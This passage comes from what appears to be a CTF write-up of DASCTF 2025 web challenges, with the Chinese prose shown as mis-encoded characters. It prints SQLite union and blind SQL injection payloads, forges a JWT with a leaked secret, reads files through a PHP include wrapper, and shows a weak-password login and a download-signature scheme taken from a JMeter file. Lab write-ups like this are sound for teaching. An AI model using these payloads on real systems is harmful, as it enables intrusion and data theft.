class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ° hs256 jwtï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;    "user": "admin",    "role": "guest",    "iat": 1764988542&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆé¦–å…ˆè¦è·å¾— secret ä¿®æ”¹ role</p><p>å°è¯•ç›²æ³¨ï¼Œå»¶æ—¶ä¼šè¿”å› 502ï¼ŒæˆåŠŸè¿”å› 302</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">'union select 1,2,(case when(1>3) then 3 else abs(0x8000000000000000) end)--0'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">case</span> <span class="token keyword">when</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> hex<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> sqlite_master<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">3</span> <span class="token keyword">else</span> randomblob<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¾—åˆ°è¡¨ç»“æ„ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> users <span class="token punctuation">(</span>id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span> username <span class="token keyword">TEXT</span><span class="token punctuation">,</span> password <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†æ³¨ä¸‹å»å‘ç°æ•°æ®åº“çœŸæ˜¯ç©ºçš„ï¼Œç”±äºç”¨çš„ <code>query</code> æŸ¥è¯¢ä¹Ÿä¸èƒ½å †å æ³¨å…¥å†™ shell</p><p>åé¢å‘ç° gallery.php çš„æ³¨é‡Šé‡Œæœ‰ secretï¼š<code>GALLERY2024SECRET</code>ï¼Œä¿®æ”¹ jwt å³å¯</p><p>ç„¶åå°±èƒ½è¿›å…¥ admin.phpï¼Œæœ‰ include æ–‡ä»¶è¯»å–ï¼Œå‘ç°ä¸èƒ½ç”¨ base64 å’Œ rot13 ç¼–ç </p><p>æµ‹è¯•å‘ç° flag åœ¨ flag.php ä¸‹ï¼Œä¼ªåè®®æ¢ä¸ªç¼–ç æ–¹å¼è¯»å‡ºæ¥</p><p><img src="/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/20251206122706.png"></p><hr><h2 id="devweb"><a href="#devweb" class="headerlink" title="devweb"></a>devweb</h2><p>è¿™é¢˜ç»™ ai æ¢­äº†æ²¡ç»·ä½</p><p>ä¸€ä¸ª vite å‰ç«¯ï¼Œç™»å½•åŠŸèƒ½éƒ½æ²¡å†™å¥½è®¿é—®çš„æ˜¯ localhost:8080&#x2F;loginï¼Œå¼±å£ä»¤ <code>admin:123456</code> ä¼šè·³è½¬åˆ° &#x2F;dashboardï¼Œä½†æ˜¯è¿”å› 404ï¼Œå°è¯•å¯»æ‰¾å¯ç”¨æ¥å£</p><p>åœ¨é¡µé¢ js ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„æ¥å£</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> Fd <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">fileList</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"app.jmx"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"index.html"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fetchFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetchFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>fileList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"app.jmx"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"index.html"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token function">downloadFile</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">æ­£åœ¨ä¸‹è½½æ–‡ä»¶: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/download?file=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;sign=6f742c2e79030435b7edc1d79b8678f6</span><span class="token template-punctuation string">`</span></span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰ app.jmx å’Œä¸€ä¸ªç­¾å <code>6f742c2e79030435b7edc1d79b8678f6</code></p><p>å°è¯•ç›´æ¥è¯»å– flag å¤±è´¥ï¼ŒçŒœæµ‹éœ€è¦ç­¾åä¹Ÿå¯¹ä¸Š</p><p>app.jmx</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version='1.0' encoding='UTF-8'?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jmeterTestPlan</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.2<span class="token punctuation">"</span></span> <span class="token attr-name">properties</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.0<span class="token punctuation">"</span></span> <span class="token attr-name">jmeter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TestPlan</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlanGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Download Test with Parameters<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.functional_mode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.serialize_threadgroups<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.user_defined_variables<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ArgumentsPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Defined Variables<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collectionProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments.arguments<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mingWen<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>mingWen<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>salt<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>salt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>f9bc855c9df15ba7602945fb939deefc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collectionProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.comments_or_notes<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.serialize_threadgroups<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TestPlan</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ThreadGroup</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroupGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Group<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.on_sample_error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>continue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.main_controller<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopControlPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Loop Controller<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController.continue_forever<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController.loops<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.num_threads<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.ramp_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>longProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.start_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>longProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>longProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.end_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>longProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.scheduler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.duration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.delay<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.same_user_on_next_iteration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ThreadGroup</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JSR223PreProcessor</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223Panel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Calculate Sign<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.language<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>groovy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.parameters<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>import org.apache.commons.codec.digest.DigestUtils;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.reset_vars<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.clear_stack<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JSR223PreProcessor.script<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        def mingWen = vars.get('mingWen');                        def firstMi = DigestUtils.md5Hex(mingWen);                        def jieStr = firstMi.substring(5, 16);                        def salt = vars.get('salt');                        def newStr = firstMi + jieStr + salt;                        def sign = DigestUtils.md5Hex(newStr);                        vars.put('sign', sign);                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JSR223PreProcessor</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTTPSamplerProxy</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HttpTestSampleGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSamplerProxy<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Download File<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.postBodyRaw<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Comment<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPsampler.Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentsPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Defined Variables<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collectionProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments.arguments<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span 